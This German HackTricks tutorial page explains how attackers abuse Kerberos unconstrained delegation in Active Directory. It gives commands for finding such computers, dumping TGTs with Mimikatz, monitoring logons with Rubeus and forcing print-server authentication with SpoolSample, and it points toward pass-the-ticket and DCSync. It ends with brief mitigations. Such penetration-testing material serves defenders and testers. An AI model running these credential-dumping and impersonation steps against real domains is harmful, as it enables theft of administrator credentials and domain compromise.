# Unbeschränkte Delegation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

## Unbeschränkte Delegation

Dies ist eine Funktion, die ein Domänenadministrator für jeden **Computer** in der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer anmeldet** und auf den Computer zugreift, wird eine **Kopie des TGTs** dieses Benutzers an den TGS gesendet, der vom DC bereitgestellt wird, und im LSASS im Speicher gespeichert. Wenn Sie Administratorrechte auf dem Computer haben, können Sie die Tickets abrufen und die Benutzer auf jedem Computer imitieren.

Wenn sich also ein Domänenadministrator auf einem Computer mit aktivierter "Unbeschränkter Delegation" anmeldet und Sie lokale Administratorrechte auf diesem Computer haben, können Sie das Ticket abrufen und den Domänenadministrator überall imitieren (Domänenprivilegierung).

Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)-Attribut [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) enthält. Dies können Sie mit einem LDAP-Filter von '(userAccountControl:1.2.840.113556.1.4.803:=524288)' tun, was Powerview tut:

<pre class="language-bash"><code class="lang-bash"># Liste der Computer ohne Einschränkungen
## Powerview
Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für Privilegierung nicht nützlich
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Tickets mit Mimikatz exportieren
</strong>privilege::debug
sekurlsa::tickets /export #Empfohlene Methode
kerberos::list /export #Eine andere Methode

# Anmeldungen überwachen und neue Tickets exportieren
.\Rubeus.exe monitor /targetuser:&#x3C;Benutzername> /interval:10 #Alle 10 Sekunden nach neuen TGTs suchen</code></pre>

Laden Sie das Ticket des Administrators (oder des Opferbenutzers) mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)** in den Speicher**.\
Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Weitere Informationen zur unbeschränkten Delegation auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Erzwinge Authentifizierung**

Wenn ein Angreifer in der Lage ist, einen für "Unbeschränkte Delegation" zugelassenen Computer zu **kompromittieren**, könnte er einen **Druckserver dazu bringen, sich automatisch** gegen ihn **anzumelden** und ein TGT im Speicher des Servers zu speichern.\
Dann könnte der Angreifer einen **Pass-the-Ticket-Angriff durchführen, um** das Benutzerkonto des Druckservers zu imitieren.

Um einen Druckserver zur Anmeldung an einem beliebigen Computer zu bringen, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Wenn das TGT von einem Domänencontroller stammt, könnten Sie einen [**DCSync-Angriff**](acl-persistence-abuse/#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Weitere Informationen zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hier sind weitere Möglichkeiten, um eine Authentifizierung zu erzwingen:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Abhilfe

* Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste.
* Setzen Sie "Konto ist sensibel und kann nicht weitergeleitet werden" für privilegierte Konten.

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com).
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>
